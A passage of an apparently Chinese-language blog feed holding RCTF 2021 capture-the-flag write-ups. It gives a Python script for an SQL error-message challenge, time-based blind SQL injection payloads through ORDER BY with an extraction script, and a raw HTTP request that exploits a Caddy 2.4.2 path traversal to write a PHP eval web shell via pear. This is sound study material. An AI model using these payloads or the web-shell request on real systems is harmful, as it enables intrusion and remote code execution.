class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$mysqli</span>-&gt;query(<span class="variable">$query</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="variable">$err_msg</span> = mysqli_error(<span class="variable">$mysqli</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$err_msg</span>) &amp;&amp; (strpos(<span class="variable">$err_msg</span>, <span class="variable">$v</span>) !== <span class="literal">false</span>)) &#123;</span><br><span class="line">        <span class="variable">$funcs</span> = extract_function(<span class="variable">$query</span>, <span class="variable">$err_msg</span>, <span class="variable">$err_code</span>, <span class="variable">$sqlstate</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$funcs</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Die&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$funcs</span> <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$func</span>, <span class="variable">$disabled_functions</span>)) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;Die&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;floor&#x27;</span>] += <span class="number">1</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;disabled_functions&#x27;</span>] = array_merge(<span class="variable">$_SESSION</span>[<span class="string">&#x27;disabled_functions&#x27;</span>], <span class="variable">$funcs</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;floor&#x27;</span>] &gt; <span class="variable">$max_floor</span>) &#123;</span><br><span class="line">            printf(<span class="string">&quot;Congratulations! and flag is %s\n&lt;br&gt;\n&quot;</span>, <span class="variable">$flag</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            printf(<span class="string">&quot;Success! You are on floor %d, and your key is %s.\n&lt;br&gt;\n&quot;</span>, <span class="variable">$_SESSION</span>[<span class="string">&#x27;floor&#x27;</span>], <span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>]);</span><br><span class="line">            printf(<span class="string">&quot;Disabled Functions: %s\n&lt;br&gt;\n&quot;</span>, implode(<span class="string">&quot;, &quot;</span>, <span class="variable">$_SESSION</span>[<span class="string">&#x27;disabled_functions&#x27;</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>满足以下条件：</p><blockquote><p>1.传入的query查询报错，返回false</p><p>2.报错信息中包含变量<code>$v</code>，随机的字符串，每次请求都会重新生成，并存放在数据库中</p><p>3.<code>extract_function()</code>函数返回值不为空</p></blockquote><p><code>extract_function()</code>函数大致功能是判断我们query是否使用了全局数组<code>$mysql_functions</code>，这个数组里面是mysql的一些函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">extract_function</span>(<span class="params"><span class="variable">$query</span>, <span class="variable">$err_msg</span>, <span class="variable">$err_code</span>, <span class="variable">$sqlstate</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$mysql_functions</span>;</span><br><span class="line">    <span class="variable">$allowed_functions</span> = <span class="keyword">array</span>(<span class="string">&quot;concat&quot;</span>, <span class="string">&quot;unhex&quot;</span>);</span><br><span class="line">    <span class="variable">$funcs</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="variable">$query_arr</span> = preg_split(<span class="string">&quot;/[^a-zA-Z0-9_]/&quot;</span>, strtolower(<span class="variable">$query</span>));</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$mysql_functions</span> <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="variable">$func</span> = strtolower(<span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">if</span>(!in_array(<span class="variable">$func</span>, <span class="variable">$allowed_functions</span>) &amp;&amp; in_array(<span class="variable">$func</span>, <span class="variable">$query_arr</span>)) &#123;</span><br><span class="line">            array_push(<span class="variable">$funcs</span>, <span class="variable">$func</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$funcs</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id><a href="#" class="headerlink" title></a></h3><h4 id="满足条件的payload"><a href="#满足条件的payload" class="headerlink" title="满足条件的payload"></a>满足条件的payload</h4><p>首先语句报错且报错信息中会出现变量$v</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set @@sql_mode:&#x3D;(select v from s where k&#x3D;$k);</span><br></pre></td></tr></table></figure><p>执行如上语句，会出现报错信息，满足第一个条件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;sql_mode&#39; can&#39;t be set to the value of &#39;796016918671763&#39;</span><br></pre></td></tr></table></figure><p>查询语句还需要出现数组<code>$mysql_functions</code>中的函数，直接在后面添加注释</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set @@sql_mode:&#x3D;(select v from s where k&#x3D;$k)&#x2F;*$func*&#x2F;;</span><br></pre></td></tr></table></figure><h4 id="-1"><a href="#-1" class="headerlink" title></a></h4><h4 id="NU1L的脚本"><a href="#NU1L的脚本" class="headerlink" title="NU1L的脚本"></a>NU1L的脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*-coding=utf-8-*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">url = <span class="string">&quot;http://124.71.132.232:23334/&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute</span>(<span class="params">query</span>):</span></span><br><span class="line">    <span class="keyword">global</span> s,url</span><br><span class="line">    query = base64.b64encode(query.encode())</span><br><span class="line">    res = s.get(url+<span class="string">&quot;?sql=&quot;</span>+query.decode()).text</span><br><span class="line">    print(res)</span><br><span class="line">    k = res.split(<span class="string">&quot;Your key is &quot;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">0</span>].strip()</span><br><span class="line">    <span class="keyword">return</span> k</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_func</span>():</span></span><br><span class="line">    c_query = <span class="string">&#x27;&#x27;&#x27;select 123;&#x27;&#x27;&#x27;</span></span><br><span class="line">    print(c_query)</span><br><span class="line">    <span class="keyword">return</span> execute(c_query)</span><br><span class="line">k = create_func()   <span class="comment">#拿到初始key</span></span><br><span class="line">l = <span class="string">&#x27;&#x27;&#x27;ASCII</span></span><br><span class="line"><span class="string">CHAR_LENGTH</span></span><br><span class="line"><span class="string">CHARACTER_LENGTH</span></span><br><span class="line"><span class="string">CONCAT</span></span><br><span class="line"><span class="string">CONCAT_WS</span></span><br><span class="line"><span class="string">FIELD</span></span><br><span class="line"><span class="string">FIND_IN_SET</span></span><br><span class="line"><span class="string">FORMAT</span></span><br><span class="line"><span class="string">INSERT</span></span><br><span class="line"><span class="string">INSTR</span></span><br><span class="line"><span class="string">LCASE</span></span><br><span class="line"><span class="string">LEFT</span></span><br><span class="line"><span class="string">LENGTH</span></span><br><span class="line"><span class="string">LOCATE</span></span><br><span class="line"><span class="string">LOWER</span></span><br><span class="line"><span class="string">LPAD</span></span><br><span class="line"><span class="string">LTRIM</span></span><br><span class="line"><span class="string">MID</span></span><br><span class="line"><span class="string">POSITION</span></span><br><span class="line"><span class="string">REPEAT</span></span><br><span class="line"><span class="string">REPLACE</span></span><br><span class="line"><span class="string">REVERSE</span></span><br><span class="line"><span class="string">RIGHT</span></span><br><span class="line"><span class="string">RPAD</span></span><br><span class="line"><span class="string">RTRIM</span></span><br><span class="line"><span class="string">SPACE</span></span><br><span class="line"><span class="string">STRCMP</span></span><br><span class="line"><span class="string">SUBSTR</span></span><br><span class="line"><span class="string">SUBSTRING</span></span><br><span class="line"><span class="string">SUBSTRING_INDEX</span></span><br><span class="line"><span class="string">TRIM</span></span><br><span class="line"><span class="string">UCASE</span></span><br><span class="line"><span class="string">UPPER</span></span><br><span class="line"><span class="string">ABS</span></span><br><span class="line"><span class="string">ACOS</span></span><br><span class="line"><span class="string">ASIN</span></span><br><span class="line"><span class="string">ATAN</span></span><br><span class="line"><span class="string">ATAN2</span></span><br><span class="line"><span class="string">AVG</span></span><br><span class="line"><span class="string">CEIL</span></span><br><span class="line"><span class="string">CEILING</span></span><br><span class="line"><span class="string">COS</span></span><br><span class="line"><span class="string">COT</span></span><br><span class="line"><span class="string">COUNT</span></span><br><span class="line"><span class="string">DEGREES</span></span><br><span class="line"><span class="string">DIV</span></span><br><span class="line"><span class="string">EXP</span></span><br><span class="line"><span class="string">FLOOR</span></span><br><span class="line"><span class="string">GREATEST</span></span><br><span class="line"><span class="string">LEAST</span></span><br><span class="line"><span class="string">LN</span></span><br><span class="line"><span class="string">LOG</span></span><br><span class="line"><span class="string">LOG10</span></span><br><span class="line"><span class="string">LOG2</span></span><br><span class="line"><span class="string">MAX</span></span><br><span class="line"><span class="string">MIN</span></span><br><span class="line"><span class="string">MOD</span></span><br><span class="line"><span class="string">PI</span></span><br><span class="line"><span class="string">POW</span></span><br><span class="line"><span class="string">POWER</span></span><br><span class="line"><span class="string">RADIANS</span></span><br><span class="line"><span class="string">RAND</span></span><br><span class="line"><span class="string">ROUND</span></span><br><span class="line"><span class="string">SIGN</span></span><br><span class="line"><span class="string">SIN</span></span><br><span class="line"><span class="string">SQRT</span></span><br><span class="line"><span class="string">SUM</span></span><br><span class="line"><span class="string">TAN</span></span><br><span class="line"><span class="string">TRUNCATE</span></span><br><span class="line"><span class="string">ADDDATE</span></span><br><span class="line"><span class="string">ADDTIME</span></span><br><span class="line"><span class="string">CURDATE</span></span><br><span class="line"><span class="string">CURRENT_DATE</span></span><br><span class="line"><span class="string">CURRENT_TIME</span></span><br><span class="line"><span class="string">CURRENT_TIMESTAMP</span></span><br><span class="line"><span class="string">CURTIME</span></span><br><span class="line"><span class="string">DATE</span></span><br><span class="line"><span class="string">DATE_ADD</span></span><br><span class="line"><span class="string">DATE_FORMAT</span></span><br><span class="line"><span class="string">DATE_SUB</span></span><br><span class="line"><span class="string">DATEDIFF</span></span><br><span class="line"><span class="string">DAY</span></span><br><span class="line"><span class="string">DAYNAME</span></span><br><span class="line"><span class="string">DAYOFMONTH</span></span><br><span class="line"><span class="string">DAYOFWEEK</span></span><br><span class="line"><span class="string">DAYOFYEAR</span></span><br><span class="line"><span class="string">EXTRACT</span></span><br><span class="line"><span class="string">FROM_DAYS</span></span><br><span class="line"><span class="string">HOUR</span></span><br><span class="line"><span class="string">LAST_DAY</span></span><br><span class="line"><span class="string">LOCALTIME</span></span><br><span class="line"><span class="string">LOCALTIMESTAMP</span></span><br><span class="line"><span class="string">MAKEDATE</span></span><br><span class="line"><span class="string">MAKETIME</span></span><br><span class="line"><span class="string">MICROSECOND</span></span><br><span class="line"><span class="string">MINUTE</span></span><br><span class="line"><span class="string">MONTH</span></span><br><span class="line"><span class="string">MONTHNAME</span></span><br><span class="line"><span class="string">NOW</span></span><br><span class="line"><span class="string">PERIOD_ADD</span></span><br><span class="line"><span class="string">PERIOD_DIFF</span></span><br><span class="line"><span class="string">QUARTER</span></span><br><span class="line"><span class="string">SEC_TO_TIME</span></span><br><span class="line"><span class="string">SECOND</span></span><br><span class="line"><span class="string">STR_TO_DATE</span></span><br><span class="line"><span class="string">SUBDATE</span></span><br><span class="line"><span class="string">SUBTIME</span></span><br><span class="line"><span class="string">SYSDATE</span></span><br><span class="line"><span class="string">TIME</span></span><br><span class="line"><span class="string">TIME_FORMAT</span></span><br><span class="line"><span class="string">TIME_TO_SEC</span></span><br><span class="line"><span class="string">TIMEDIFF</span></span><br><span class="line"><span class="string">TIMESTAMP</span></span><br><span class="line"><span class="string">TO_DAYS</span></span><br><span class="line"><span class="string">WEEK</span></span><br><span class="line"><span class="string">WEEKDAY</span></span><br><span class="line"><span class="string">WEEKOFYEAR</span></span><br><span class="line"><span class="string">YEAR</span></span><br><span class="line"><span class="string">YEARWEEK</span></span><br><span class="line"><span class="string">BIN</span></span><br><span class="line"><span class="string">BINARY</span></span><br><span class="line"><span class="string">CASE</span></span><br><span class="line"><span class="string">CAST</span></span><br><span class="line"><span class="string">COALESCE</span></span><br><span class="line"><span class="string">CandyShop  </span></span><br><span class="line"><span class="string">CONNECTION_ID</span></span><br><span class="line"><span class="string">CONV</span></span><br><span class="line"><span class="string">CONVERT</span></span><br><span class="line"><span class="string">CURRENT_USER</span></span><br><span class="line"><span class="string">DATABASE</span></span><br><span class="line"><span class="string">IF</span></span><br><span class="line"><span class="string">IFNULL</span></span><br><span class="line"><span class="string">ISNULL</span></span><br><span class="line"><span class="string">LAST_INSERT_ID</span></span><br><span class="line"><span class="string">NULLIF</span></span><br><span class="line"><span class="string">SESSION_USER</span></span><br><span class="line"><span class="string">SYSTEM_USER</span></span><br><span class="line"><span class="string">USER</span></span><br><span class="line"><span class="string">VERSION</span></span><br><span class="line"><span class="string">ENCRYPT</span></span><br><span class="line"><span class="string">MD5</span></span><br><span class="line"><span class="string">OLD_PASSWORD</span></span><br><span class="line"><span class="string">PASSWORD&#x27;&#x27;&#x27;</span></span><br><span class="line">l = l.split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">    execute(<span class="string">&quot;set @@sql_mode:=(select v from s where k=&#x27;&quot;</span>+k+<span class="string">&quot;&#x27;)/*&quot;</span>+i+<span class="string">&quot;*/;&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="0x02-EasySQLi"><a href="#0x02-EasySQLi" class="headerlink" title="0x02 EasySQLi"></a>0x02 EasySQLi</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;db.php&#x27;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">set_time_limit(<span class="number">1</span>);</span><br><span class="line"><span class="variable">$s</span> = floatval(microtime());</span><br><span class="line"></span><br><span class="line"><span class="variable">$order</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;order&#x27;</span>] ?? <span class="number">1</span>;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT CONCAT(&#x27;RCTF&#123;&#x27;,USER(),&#x27;&#125;&#x27;) AS FLAG WHERE &#x27;🍬关注嘉然🍬&#x27; = &#x27;🍬顿顿解馋🍬&#x27; OR &#x27;🍬Watch Diana a day🍬&#x27; = &#x27;🍬Keep hunger away🍬&#x27; OR &#x27;🍬嘉然に注目して🍬&#x27; = &#x27;🍬食欲をそそる🍬&#x27; ORDER BY <span class="subst">$order</span>;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$stm</span> = <span class="variable">$pdo</span>-&gt;prepare(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$stm</span>-&gt;execute();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Count <span class="subst">&#123;$stm-&gt;rowCount()&#125;</span>.&quot;</span>;</span><br><span class="line"></span><br><span class="line">usleep((<span class="number">1</span> + floatval(microtime()) - <span class="variable">$s</span>) * <span class="number">1e6</span>);</span><br><span class="line">Count <span class="number">0.</span></span><br></pre></td></tr></table></figure><p>order by注入，但是查询得到的row count=0，默认order by 后面的语句不会执行</p><p>但在sql语句预处理时，会提前对sql语句进行优化，也就会执行某些语句</p><p>再用if判断，构造查询时间差进行判断</p><p>NU1L的payload，利用长字符串的拼接构造的时间差，大概的时间差在0.5s左右</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&quot;updatexml(1,if(ascii(substr((&#123;&#125;)&#123;&#125;,1))=&#x27;&#123;&#125;&#x27;,concat(repeat(&#x27;a&#x27;,40000000),repeat(&#x27;a&#x27;,40000000),repeat(&#x27;a&#x27;,40000000),repea</span></span><br><span class="line"><span class="string">t(&#x27;a&#x27;,40000000),repeat(&#x27;b&#x27;,10000000)),1),1)&quot;</span></span><br></pre></td></tr></table></figure><p>Redbud的payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&quot;updatexml(1,if(ascii(substr((&#123;&#125;)&#123;&#125;,1))=&#x27;&#123;&#125;&#x27;,(select length(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(&#x27;1&#x27;)))))))))))))))))))))))))))))))),1),1)&quot;</span></span><br></pre></td></tr></table></figure><p>也是构造长字符串，但用的是hex，时间差大概在2s左右</p><p>脚本就很简单了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">alp = string.digits+string.ascii_letters+string.punctuation</span><br><span class="line"><span class="comment">#print(alp)</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://124.71.132.232:11002/&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> alp:</span><br><span class="line">        order = <span class="string">&#x27;&#x27;&#x27;updatexml(1,if(substr((select user()),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;,(select length(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(&#x27;1&#x27;)))))))))))))))))))))))))))))))),1),1)&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(i,x)</span><br><span class="line">        r = requests.get(url,params=&#123;<span class="string">&#x27;order&#x27;</span>:order&#125;)</span><br><span class="line">        print(r.elapsed.total_seconds())</span><br><span class="line">        <span class="keyword">if</span> r.elapsed.total_seconds() &gt; <span class="number">2</span>:</span><br><span class="line">            flag += x</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;0x01-源码&quot;&gt;&lt;a href=&quot;#0x01-源码&quot; class=&quot;headerlink&quot; title=&quot;0x01 源码&quot;&gt;&lt;/a&gt;0x01 源码&lt;/h3&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://123-prog.github.io/categories/CTF/"/>
    
    <category term="sql注入" scheme="https://123-prog.github.io/categories/CTF/sql%E6%B3%A8%E5%85%A5/"/>
    
    
    <category term="sqli" scheme="https://123-prog.github.io/tags/sqli/"/>
    
    <category term="控制错误信息" scheme="https://123-prog.github.io/tags/%E6%8E%A7%E5%88%B6%E9%94%99%E8%AF%AF%E4%BF%A1%E6%81%AF/"/>
    
    <category term="order by 无查询数据 基于时间盲注" scheme="https://123-prog.github.io/tags/order-by-%E6%97%A0%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE-%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/"/>
    
  </entry>
  
  <entry>
    <title>(RCTF2021)VerySafe</title>
    <link href="https://123-prog.github.io/2021/09/17/RCTF2021-VerySafe/"/>
    <id>https://123-prog.github.io/2021/09/17/RCTF2021-VerySafe/</id>
    <published>2021-09-17T14:56:14.000Z</published>
    <updated>2021-09-22T10:21:35.732Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-题目"><a href="#0x01-题目" class="headerlink" title="0x01 题目"></a>0x01 题目</h3><p>第一次看到这样的题，整个题愣是一点代码都没有</p><p>给了docker-compose文件</p><a id="more"></a><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">version: &#x27;3&#x27;</span><br><span class="line">services:</span><br><span class="line">  caddy:</span><br><span class="line">    image: caddy:2.4.2</span><br><span class="line">    restart: unless-stopped</span><br><span class="line">    volumes:</span><br><span class="line">      - ./conf/Caddyfile:/etc/caddy/Caddyfile</span><br><span class="line">    ports:</span><br><span class="line">      - &quot;54120:80&quot;</span><br><span class="line">  php:</span><br><span class="line">    image: php:7.4-fpm-alpine</span><br><span class="line">    restart: unless-stopped</span><br><span class="line">    working_dir: /srv</span><br><span class="line">    volumes:</span><br><span class="line">      - ./src:/srv</span><br></pre></td></tr></table></figure><p>caddy版本为2.4.2，传递script_path给php-fpm的时候可以目录穿越，也就是说，可以尝试让php-fpm解析我们的指定文件</p><p>该漏洞2.4.3之后就修复了，可以在<a href="https://github.com/caddyserver/caddy/commit/9d4ed3a3236df06e54c80c4f6633b66d68ad3673">https://github.com/caddyserver/caddy/commit/9d4ed3a3236df06e54c80c4f6633b66d68ad3673</a> 看到具体修复</p><h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>可用的php文件，自己在本地用docker建了个环境，找一下php文件</p><p><img src="/2021/09/17/RCTF2021-VerySafe/Snipaste_2021-09-17_23-22-22.png"></p><p>可以看到，pear扩展包</p><h3 id="0x03-写马"><a href="#0x03-写马" class="headerlink" title="0x03 写马"></a>0x03 写马</h3><p>可以在网上找到pear的用法，其中<code>pear config-create xxx xxx</code>用于创建一个配置文件，第一个参数为home目录，这个参数会出现在配置文件中</p><p>所以可以这样写马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pear config-create &#x2F;tmp&#x2F;&lt;?&#x3D;eval($_POST[1]);?&gt; &#x2F;tmp&#x2F;shell.php</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;..&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;peclcmd.php?+config-create+&#x2F;tmp&#x2F;&lt;?&#x3D;eval($_POST[1]);?&gt;+&#x2F;tmp&#x2F;shell.php HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.231.248:54120</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;93.0.4577.82 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>在本地环境测试，shell.php会被创建，而且内容为</p><p><img src="/2021/09/17/RCTF2021-VerySafe/Snipaste_2021-09-17_23-28-14.png"></p><p>成功写码，接下来目录穿越访问就可以了</p><p><img src="/2021/09/17/RCTF2021-VerySafe/Snipaste_2021-09-17_23-31-38.png"></p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;0x01-题目&quot;&gt;&lt;a href=&quot;#0x01-题目&quot; class=&quot;headerlink&quot; title=&quot;0x01 题目&quot;&gt;&lt;/a&gt;0x01 题目&lt;/h3&gt;&lt;p&gt;第一次看到这样的题，整个题愣是一点代码都没有&lt;/p&gt;
